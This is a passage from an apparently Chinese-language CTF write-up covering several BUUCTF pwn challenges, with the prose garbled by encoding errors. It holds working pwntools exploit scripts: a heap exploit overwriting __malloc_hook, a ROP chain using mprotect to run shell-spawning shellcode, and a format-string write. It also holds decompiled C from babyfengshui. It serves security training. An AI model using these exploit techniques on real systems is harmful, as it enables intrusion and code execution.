</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dump</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># a0,b1,c2,d3</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># e4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># b</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># c-&gt;fd = e</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x80</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x21</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># c1</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># e2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x91</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x91</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># f5</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># e, e-&gt;fd = unsorted_head</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>dump</span><span class=p>(</span><span class=mi>2</span><span class=p>)[:</span><span class=mi>8</span><span class=p>])</span><span class=o>-</span><span class=mh>0x3c4b78</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># g</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># g-&gt;fd = _IO()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x3c4aed</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g5</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># _IO()6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># _IO() + 0x13 == __malloc_hook(), one_gadget</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x13</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># malloc() -&gt; __malloc_hook()</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=get_started_3dsctf_2016>get_started_3dsctf_2016</h3><p>æœ¬åœ°è¿è¡Œè„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>get_flag</span> <span class=o>=</span> <span class=mh>0x80489a0</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span><span class=p>,</span><span class=n>get_flag</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=mh>0x308cd64f</span><span class=p>,</span><span class=mh>0x195719d1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>r</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ¬æ¥è¿™æ ·æ˜¯å¯ä»¥ç›´æ¥è¯»å– flag çš„ï¼Œä½†æ˜¯è¿œç¨‹ä¸è¡Œã€‚å› æ­¤è¿œç¨‹è¿è¡Œæ—¶æ¢äº†ä¸€ç§æ›´å…·éš¾åº¦çš„æ–¹æ³•ï¼Œå°±æ˜¯è°ƒç”¨ <code>mprotect</code> ä¿®æ”¹ <code>bss</code> æ®µæƒé™ä½¿å¾—å…¶å¯æ‰§è¡Œï¼Œéšåå†™å…¥ shellcodeã€‚</p><p>éœ€è¦æ³¨æ„ <code>mprotect</code> ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚é¡µå¯¹é½ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º <code>7</code> è¡¨ç¤º <code>rwx</code>ã€‚ä¿®æ”¹å®Œæˆåä»æ ‡å‡†è¾“å…¥è¯»å…¥ shellcodeï¼Œå†™å…¥ <code>bss_base</code> åè¿”å›åˆ° <code>bss_base</code> å¤„æ‰§è¡Œã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop3</span> <span class=o>=</span> <span class=mh>0x80483b8</span>
</span></span><span class=line><span class=cl><span class=n>got_base</span> <span class=o>=</span> <span class=mh>0x80eb000</span>
</span></span><span class=line><span class=cl><span class=n>bss_base</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>],</span><span class=n>pop3</span><span class=p>,</span><span class=n>got_base</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>pop3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>bss_base</span><span class=p>,</span><span class=mh>0x200</span><span class=p>,</span><span class=n>bss_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=not_the_same_3dsctf_2016>not_the_same_3dsctf_2016</h3><p>å’Œä¸Šé¢ get_started åšæ³•ä¸€æ ·ã€‚æˆ‘æ€€ç–‘ BUU ä¸Šä¸€é¢˜åœ¨æœåŠ¡å™¨ä¸Šæ”¾é”™äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¹Ÿæ”¾äº†è¿™ä¸€é¢˜çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªè„šæœ¬æ‰ä¼šæ— æ•ˆã€‚</p><h3 id=ç¬¬äº”ç©ºé—´-2019-å†³èµ›pwn5>[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5</h3><p>é•¿åº¦é™åˆ¶æ— æ³•æ ˆæº¢å‡ºï¼Œä½†æ˜¯å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚é€šè¿‡ <code>aaaa %08x %08x ...</code> å¯ä»¥åˆ¤æ–­åç§»ä¸º 10ã€‚</p><p>ç„¶ååˆ©ç”¨ <code>%10$n</code> ä¿®æ”¹ <code>0x804c044</code> åœ°å€ï¼ˆIDA å¾—åˆ°ï¼‰å¤„çš„å€¼å³å¯ï¼Œæœ€åè¾“å…¥ <code>passwd</code> éœ€è¦ä¸å·²æˆåŠŸè¾“å‡ºçš„å­—ç¬¦æ•°ç›¸ç­‰ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹ <code>atoi</code> çš„ GOT åœ°å€ä¸º <code>system</code> çš„ PLT åœ°å€ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804c044</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;%10$n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_n_8>ciscn_2019_n_8</h3><p>IDA å¯çŸ¥éœ€è¦è®© var çš„ä¸‹æ ‡ä¸º 13 çš„å…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯ç¬¬ 14 ä¸ªï¼‰ç­‰äº 17ï¼Œç›´æ¥æŒ‰ç…§éœ€æ±‚å†™è„šæœ¬å³å¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span><span class=o>*</span><span class=mi>14</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=babyfengshui_33c3_2016>babyfengshui_33c3_2016</h3><p>æœ¬é¢˜æºç å¤§è‡´å¦‚ä¸‹ï¼Œå¼€å¯äº† canary å’Œ NXï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=n>__noreturn</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// [esp+3h] [ebp-15h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>action</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-14h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>size_t</span> <span class=n>input</span><span class=p>;</span> <span class=c1>// [esp+8h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>alarm</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;0: Add a user&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;1: Delete a user&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;2: Display a user&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;3: Update a user description&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;4: Exit&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Action:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>action</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>action</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;size of description:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%u%c&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>add</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;index:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>delete</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;index:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>display</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;index:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>update</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Bye&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span> <span class=o>&gt;</span> <span class=mh>0x31u</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>puts</span><span class=p>(</span><span class=s>&#34;maximum capacity exceeded, bye&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘ä»¬é‡ç‚¹å…³æ³¨å¯èƒ½å­˜åœ¨æ¼æ´çš„ <code>add</code> å’Œ <code>update</code>ï¼Œé¦–å…ˆæ˜¯ <code>add</code>ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>_DWORD</span> <span class=o>*</span><span class=kr>__cdecl</span> <span class=nf>add</span><span class=p>(</span><span class=n>size_t</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>desc</span><span class=p>;</span> <span class=c1>// ST24_4
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_DWORD</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span> <span class=c1>// ST28_4
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>desc</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>desc</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>user</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x80u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>user</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x80u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>user</span> <span class=o>=</span> <span class=n>desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>users</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span><span class=p>]</span> <span class=o>=</span> <span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;name:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>read_name</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span><span class=p>]</span> <span class=o>+</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>124</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>update</span><span class=p>(</span><span class=o>++</span><span class=n>total_users</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œå¯ä»¥å¤§è‡´äº†è§£åˆ° <code>user</code> ç»“æ„ä½“å¤§çº¦é•¿è¿™æ ·ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>user</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>description</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mi>124</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„ <code>descrption</code> æ˜¯ <code>user</code> å¼€å§‹çš„åœ°æ–¹ã€‚</p><p>éšåå‘ç° <code>update</code> ä¸­å­˜åœ¨ä¸€å¤„é˜²æŠ¤æªæ–½ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
